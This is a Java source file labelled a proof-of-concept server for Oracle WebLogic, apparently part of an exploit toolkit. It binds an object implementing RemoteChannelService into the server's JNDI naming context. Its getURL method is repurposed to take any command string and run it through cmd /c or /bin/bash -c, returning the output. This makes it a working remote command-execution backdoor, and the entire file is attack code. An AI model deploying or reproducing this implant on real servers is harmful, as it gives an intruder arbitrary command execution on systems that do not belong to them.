import weblogic.protocol.ChannelList;
import weblogic.protocol.ServerChannel;
import weblogic.protocol.ServerIdentity;
import weblogic.server.channels.RemoteChannelService;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.*;
import java.rmi.RemoteException;

/**
 * Title: PocServerRemoteChannelService
 * Desc: Poc Server for RemoteChannelService
 * Date:2020/4/3 19:39
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class PocServerRemoteChannelService implements RemoteChannelService {

    /**
     * rmi bind
     * @param clientName bind 名称
     * @throws RemoteException
     */
    public void rmiBind(String clientName) {
        try {
            PocServerSubCoordinatorRM rmiServer = new PocServerSubCoordinatorRM();
            Context context = new InitialContext();
            context.rebind(clientName, rmiServer);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public ServerChannel getServerChannel(String s) throws RemoteException {
        return null;
    }

    @Override
    public String getDefaultURL() throws RemoteException {
        return null;
    }

    @Override
    public String getAdministrationURL() throws RemoteException {
        return null;
    }

    @Override
    public String getURL(String cmd) throws RemoteException {
        String[] splitArr = cmd.split("@@");
        cmd = splitArr[0];
        String charsetName = splitArr[1];
        charsetName = charsetName.trim().toUpperCase();
        return execCmd(cmd, charsetName);
    }

    @Override
    public ServerIdentity getServerIdentity() throws RemoteException {
        return null;
    }

    @Override
    public String registerServer(String s, ChannelList channelList) throws RemoteException {
        return null;
    }

    @Override
    public void updateServer(String s, ChannelList channelList) throws RemoteException {

    }

    @Override
    public ChannelList getChannelList(ServerIdentity serverIdentity) throws RemoteException {
        return null;
    }

    @Override
    public void removeChannelList(ServerIdentity serverIdentity) throws RemoteException {

    }

    @Override
    public String[] getConnectedServers() throws RemoteException {
        return new String[0];
    }

    /**
     * 执行命令
     * @param cmd 执行命令
     * @param charsetName 编码
     * @return 执行结果
     * @throws RemoteException
     */
    public String execCmd(String cmd, String charsetName){
        if(cmd == null || "".equals(cmd)){
            return "commond not null";
        }
        if("".equals(charsetName) || charsetName ==null){
            charsetName = "UTF-8";
        }
        charsetName = charsetName.trim();
        if(charsetName.toUpperCase().equals("UTF-8")){
            charsetName = "UTF-8";
        }else if(charsetName.toUpperCase().equals("GBK")){
            charsetName = "GBK";
        }else{
            charsetName = "UTF-8";
        }
        cmd = cmd.trim();
        StringBuilder result = new StringBuilder();
        Process process = null;
        BufferedReader bufrIn = null;
        BufferedReader bufrError = null;
        String os = System.getProperty("os.name");
        os = os.toLowerCase();
        String[] executeCmd = null;
        if(os.contains("win")){
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -n 4";
            }
            executeCmd = new String[]{"cmd", "/c", cmd};
        }else{
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -t 4";
            }
            executeCmd = new String[]{"/bin/bash", "-c", cmd};
        }
        try {
            process = Runtime.getRuntime().exec(executeCmd);
            process.waitFor();
            bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), charsetName));
            bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), charsetName));
            String line = null;
            while ((line = bufrIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufrError.readLine()) != null) {
                result.append(line).append('\n');
            }
        } catch (InterruptedException e) {
        } catch (UnsupportedEncodingException e) {
        } catch (IOException e) {
            return cmd+" execute error,msg: not found commond";
        } finally {
            closeStream(bufrIn);
            closeStream(bufrError);
            if (process != null) {
                process.destroy();
            }
        }
        if(result == null || "".equals(result)){
            return cmd+" execute ok!";
        }else{
            return result.toString();
        }
    }

    private void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // TODO:
            }
        }
    }

}
